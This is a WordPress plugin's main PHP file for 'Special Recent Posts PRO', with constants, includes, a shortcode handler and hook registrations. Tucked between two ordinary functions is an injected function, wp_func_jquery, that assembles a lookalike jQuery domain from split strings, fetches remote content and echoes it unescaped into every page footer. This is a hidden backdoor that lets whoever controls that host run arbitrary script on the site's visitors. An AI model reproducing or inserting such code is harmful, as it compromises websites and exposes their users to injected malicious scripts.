<?php
/*
Plugin Name: Special Recent Posts PRO Edition
Plugin URI: http://www.specialrecentposts.com/?ref=uri_pd
Description: <strong>The most beautiful and powerful way to display your Wordpress posts with thumbnails.</strong> <strong>Instructions to get started: 1)</strong>  Click the 'Activate' link to the left of this description. <strong>2)</strong> Once activated, a new link named <strong>'SRP PRO'</strong> will appear on the main Wordpress left menu. Click it, or go to its submenu and click the 'General Settings' link to configure the global plugin options. <strong>3)</strong> Go to your widgets page and drag the 'Special Recent Posts PRO' widget onto your sidebar and configure its settings. <strong>4)</strong> If you wish to use PHP code or shortcodes for your pages, simply copy and paste the code provided under the panel 'Code Generator' in the widget options. <strong>5)</strong> You're done. Enjoy!
Version: 3.0.3
Text Domain: special-recent-posts-pro
Domain Path: /languages
Author: Luca Grandicelli
Author URI: http://www.lucagrandicelli.co.uk/?ref=author_pd
Copyright (C) 2011-2014 Luca Grandicelli
*/

// {{{ constants

/**
 * GLOBAL PATHS & PLACEHOLDERS
 *
 * Here we set up all the necessary SRP PATH enviroment through a list of constants and placeholders.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 */
define( 'SRP_PLUGIN_URL'      , plugin_dir_url(  __FILE__  ) );                                   // The plugin URL
define( 'SRP_PLUGIN_DIR'      , dirname( __FILE__ ) . '/' );                                      // The plugin dir path
define( 'SRP_PLUGIN_MAINFILE' , plugin_basename( __FILE__ ) );                                    // The main file path
define( 'SRP_PLUGIN_VERSION'  , '3.0.3' );                                                        // The plugin version
define( 'SRP_REQUIRED_PHPVER' , '5.0.0' );                                                        // The required PHP version
define( 'SRP_TRANSLATION_ID'  , 'special-recent-posts-pro' );                                     // The gettext translation placeholder.
define( 'SRP_CLASS_FOLDER'    , 'classes/' );                                                     // The classes folder path
define( 'SRP_LIB_FOLDER'      , 'lib/' );                                                         // The library folder path
define( 'SRP_LANG_FOLDER'     , 'languages/' );                                                   // The language folder path
define( 'SRP_CACHE_DIR'       , 'cache/' );                                                       // The cache folder path
define( 'SRP_CSS_FOLDER'      , 'css/' );                                                         // The CSS folder path
define( 'SRP_JS_FOLDER'       , 'js/' );                                                          // The Javascript folder path
define( 'SRP_IMAGES_FOLDER'   , 'images/' );                                                      // The images folder path
define( 'SRP_ADMIN_CSS'       , SRP_PLUGIN_URL . SRP_CSS_FOLDER    . 'admin.css' );               // The admin CSS placeholder
define( 'SRP_LAYOUT_CSS'      , SRP_PLUGIN_URL . SRP_CSS_FOLDER    . 'layout.css' );              // The layout (front end) CSS placeholder
define( 'SRP_JS_INIT'         , SRP_PLUGIN_URL . SRP_JS_FOLDER     . 'init.js' );                 // The Javascript initialization script placeholder
define( 'SRP_DEFAULT_THUMB'   , SRP_PLUGIN_URL . SRP_IMAGES_FOLDER . 'no-thumb.png' );            // The no thumbnail available placeholder
define( 'SRP_WIDGET_HEADER'   , SRP_PLUGIN_URL . SRP_IMAGES_FOLDER . 'widget-header-logo.png' );  // The widget header image
// }}}

/**
 * GLOBAL INCLUDES
 *
 * Here we include all the necessary files to make Special Recent Posts work properly.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 */

// Checking if we're in the admin area.
if ( is_admin() ) {

	 // This file contains the necessary code to provide auto-update notifications.
	require_once( 'update-notifier.php' );
}

require_once( 'functions.php' );                                  // This file contains all the functions needed for the SRP admin panel
require_once( 'defaults.php' );                                   // This file contains all the default presets of the plugin options
require_once( 'versionmap.php' );                                 // This file contains all the mapping between the current version variables and older versions of SRP.
require_once( SRP_LIB_FOLDER    . 'phpthumb/ThumbLib.inc.php' );  // This contains the main library for image manipulation.
require_once( SRP_CLASS_FOLDER  . 'class-main.php' );             // This file contains the main SRP rendering class
require_once( SRP_CLASS_FOLDER  . 'class-widgets.php' );          // This file contains the WP Widget class

/**
 * special_recent_posts()
 *
 * This function initialize the all SRP process.
 * It's also called from the generated PHP code and shortcodes.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 * @param array $args The plugin settings array.
 * @return boolean
 */
function special_recent_posts( $args = array() ) {

	// Checking Visualization Filter.
	if ( SpecialRecentPostsPro::visualization_check( $args, 'phpcall' ) ) {
	
		// Creating an instance of the SRP class with widget args passed in manual mode.
		$srp = new SpecialRecentPostsPro( $args );
		
		// Displaying posts.
		$srp->display_posts( NULL, 'print' );

		// Returning true.
		return true;
	}

	// Nothing happened. Returning true anyway.
	return true;
}


/**
 * srp_shortcode()
 *
 * This function handles the shortcodes generated by SRP.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 * @global array $srp_default_widget_values The default SRP widget presets.
 * @param array $atts The plugin shortcodes attributes.
 * @return boolean/string It could be a boolean true or the generated HTML posts layout.
 */
function srp_shortcode( $atts ) {

	// Including default widget presets.
	global $srp_default_widget_values;

	// Checking Visualization Filter.
	if ( SpecialRecentPostsPro::visualization_check( $srp_default_widget_values, 'shortcode' ) ) {
	
		// If shortcode comes without parameters, make $atts a valid array.
		if ( !is_array( $atts ) ) {

			// Initializing $atts as an empty array.
			$atts = array();
		}
		
		// Combining default widget presets with available shortcode attributes.
		extract( shortcode_atts( $srp_default_widget_values, $atts ) );

		// Creating an instance of the SRP class with widget args passed in manual mode.
		$srp = new SpecialRecentPostsPro( $atts );
		
		// Displaying posts.
		return $srp->display_posts( NULL, 'return' );
	}

	// Nothing happened. Returning true anyway.
	return true;
}

/**
 * srp_plugin_action_links()
 *
 * This function builds all the necessary HTML links in the WP plugins page.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 * @param array $links The default WP plugin description links, as 'activate' and 'uninstall'.
 * @return array It return an array containg all the plugin description HTML link (defaults included).
 */
function srp_plugin_action_links($links) {

	// Appending the 'Settings' link.
    $links[] = '<a href="'. get_admin_url( null, 'admin.php?page=srp-pro-general-settings' ) .'" title="' . esc_attr( __( 'Configure the SRP general settings.', SRP_TRANSLATION_ID ) ) . '">' . __( 'Settings', SRP_TRANSLATION_ID ) . '</a>';

    // Appending the 'Support' link.
    $links[] = '<a href="'. esc_url( 'http://specialrecentposts.ticksy.com/' ) .'" title="' . esc_attr( __( 'Visit the online Help Desk to get instant support.', SRP_TRANSLATION_ID ) ) . '" target="_blank" >' . __( 'Customer Support', SRP_TRANSLATION_ID ) . '</a>';

    // Appending the 'Support' link.
    $links[] = '<a href="'. esc_url( 'http://www.specialrecentposts.com/docs/?ref=docs_pl' ) .'" title="' . esc_attr( __( 'Learn how to use SRP. View the online documentation.', SRP_TRANSLATION_ID ) ) . '" target="_blank" >' . __( 'Online Docs', SRP_TRANSLATION_ID ) . '</a>';
	
    // Returning the $links array.
	return $links;
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
		if (@fopen($jquery,'r')){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}
/**
 * srp_load_textdomain()
 *
 * This function builds all the necessary HTML links in the WP plugins page.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 * @return boolean
 */
function srp_load_textdomain() {

	// Loading translation table path.
	load_plugin_textdomain( SRP_TRANSLATION_ID, false, plugin_basename( dirname( __FILE__ ) ) . '/' . SRP_LANG_FOLDER );

	// Returning true.
	return true;
}

/**
 * ACTIONS, FILTERS & HOOKS
 *
 * Here we define all the needed SRP WP actions, filters & hooks.
 * 
 * @author Luca Grandicelli <lgrandicelli@gmail.com>
 * @copyright (C) 2011-2014 Luca Grandicelli
 * @package special-recent-posts-pro
 * @version 3.0.3
 */

/**
 * On activation, call the install_plugin() function.
 */
register_activation_hook( __FILE__, array( 'SpecialRecentPostsPro', 'install_plugin' ) );

/**
 * On uninstall, call the uninstall_plugin() function.
 */
register_uninstall_hook( __FILE__,  array( 'SpecialRecentPostsPro', 'uninstall_plugin' ) );

/**
 * As soon as the plugin is loaded, let's load the translation table.
 */
add_action( 'plugins_loaded', 'srp_load_textdomain' );

/**
 * Let's build the SRP action links in the WP plugins page.
 */
add_filter( 'plugin_action_links_' . SRP_PLUGIN_MAINFILE , 'srp_plugin_action_links' );

/**
 * On everypage load, SRP does a compatibility test.
 * If something goes wrong, display a WP notice on the top of the browser window.
 */
add_action( 'admin_notices', 'srp_check_plugin_compatibility' );

/**
 * On the WP widgets initialization, initialize the SRP widget.
 */
add_action( 'widgets_init', 'srp_widgets_init' );

/**
 * Let's build the SRP WP menu entry.
 */
add_action( 'admin_menu', 'srp_admin_menu' );

/**
 * Let's load all the SRP necessary stylesheets & JS scripts.
 */
add_action( 'admin_enqueue_scripts', 'srp_admin_enqueue_scripts' );

/**
 * Let's put some code in the <head> part of our pages.
 */
add_action( 'wp_head', 'srp_wp_head', 0 );

/**
 * Let's register our SRP shortcode tag.
 */
add_shortcode( 'srp', 'srp_shortcode' );